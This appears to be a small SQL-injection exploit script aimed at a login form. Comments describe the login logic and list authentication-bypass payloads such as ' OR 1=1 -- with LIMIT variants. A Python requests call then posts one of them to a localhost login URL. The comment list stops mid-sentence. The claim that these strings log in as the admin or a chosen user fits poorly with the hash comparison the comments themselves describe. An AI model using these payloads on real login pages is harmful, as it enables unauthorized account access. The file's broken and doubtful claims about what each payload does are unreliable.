
#
#1. Connect to the database
#2. Execute a query to get the password for the given username
#3. If the username is not found, redirect to the login page
#4. If the username is found, hash the password and compare it to the stored hash
#5. If the hashes match, redirect to the dashboard
#6. If the hashes don't match, redirect to the login page
#
#The code is vulnerable to SQL injection. The username is not properly sanitized before being used in the query.
#
#The following payload will log you in as the admin user:
#
#' OR 1=1 --
#
#The following payload will log you in as the first user in the database:
#
#' OR 1=1 LIMIT 1 --
#
#The following payload will log you in as the second user in the database:
#
#' OR 1=1 LIMIT 1,1 --
#
#The following payload will log you in as the

import requests

url = "http://localhost:5000/login"

payload = "' OR 1=1 LIMIT 1,1 --"

r = requests.post(url, data={"username": payload})

print(r.text)